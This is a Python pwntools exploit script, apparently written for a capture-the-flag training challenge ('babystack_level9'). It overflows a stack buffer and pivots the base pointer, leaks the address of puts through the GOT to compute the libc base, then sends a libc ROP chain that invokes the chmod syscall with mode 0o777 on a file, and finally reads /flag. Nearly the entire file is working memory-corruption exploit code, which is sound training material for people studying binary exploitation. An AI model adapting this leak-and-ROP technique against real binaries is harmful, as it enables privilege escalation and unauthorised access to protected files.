#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babystack_level7
from pwn import *
from os import system

# Set up pwntools for the correct architecture
elf = context.binary = ELF(args.EXE or '/challenge/babystack_level9')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break *0x4014d8
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

# def rop(base,rbp):
#     pop_rdi = [base+0x401553, 0x1eb1f3]
#     pop_rsi = [base+0x2601f, 0x4]
#     syscall = [base+0x10db60] 
#     chain = b''.join(map(p64, pop_rdi + pop_rsi + syscall))
#     return chain

def leak_libc():
    pop_rdi = 0x401553 # ROPgadget --binary /challenge/--only "pop|ret" 
    got_puts = 0x404020
    plt_puts = 0x4010d0
    return  b''.join(map(p64, [pop_rdi, got_puts, plt_puts]))   

io = start()
io.recvuntil(b"base pointer rbp: ")
bp = int(io.recvline(keepends=False), 16)

io.recvuntil(b"will be stored: ")
buf = int(io.recvline(keepends=False), 16)

new_rbp = 0x404788
exploit = cyclic(bp - buf) + p64(new_rbp) + leak_libc() + p64(0x4014c4) 

io.sendline(exploit)

leaked_bytes = io.recvline(keepends=False)
leaked_bytes = io.recvline(keepends=False)
leaked_puts = u64(leaked_bytes.ljust(8, b"\0"))
print(f"leaked puts: 0x{leaked_puts:x}")
offset_puts = 0x84420
base = leaked_puts - offset_puts
print(f"libc_base: 0x{base:x}")

rop = b''
rop += p64(base + 0x23b6a)  #pop rdi from libc binary
rop += p64(base + 0x1eb1f3) #ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "group"
rop += p64(base+0x2601f)    #ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rsi'
rop += p64(0o777)           #p64(0o777)
rop += p64(base+0x36174)    #ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rax'
rop += p64(0x5a)            #hex value of chmod which is p64(0x5a) 
rop += p64(base+0x2284d)    #ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "syscall"

payload = b'B'* (0x800 + 8) + rop
io.sendline(payload)

system("cat /flag")
io.interactive()
